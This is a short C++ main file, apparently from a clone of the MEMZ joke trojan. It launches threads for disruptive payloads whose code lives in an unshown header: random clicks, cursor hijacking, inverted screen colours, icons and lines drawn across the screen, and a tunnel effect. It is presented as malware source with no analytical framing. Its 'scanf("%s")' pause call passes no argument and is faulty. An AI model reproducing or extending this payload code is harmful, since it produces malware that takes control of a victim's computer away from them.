#include <thread>
#include "MEMZ.h" // Process Main 

using namespace std;

int main(){
    thread a(infclick); // Random Click
    thread b(infInvColor); // Invert Screen Color
    thread c(infIcon); // Random Draw Icons
    thread d(infCursor); // Random Move Mouse
    thread e(infChange); // Invert String
    thread f(inftunnel); // Draw Tunnel Effect 
    thread g(randomDraw); // Random Draw Lines
    scanf("%s"); // Pause Program
    /*
    infclick();
    infInvColor();
    infIcon();
    infCursor();
    infChange();
    */
}
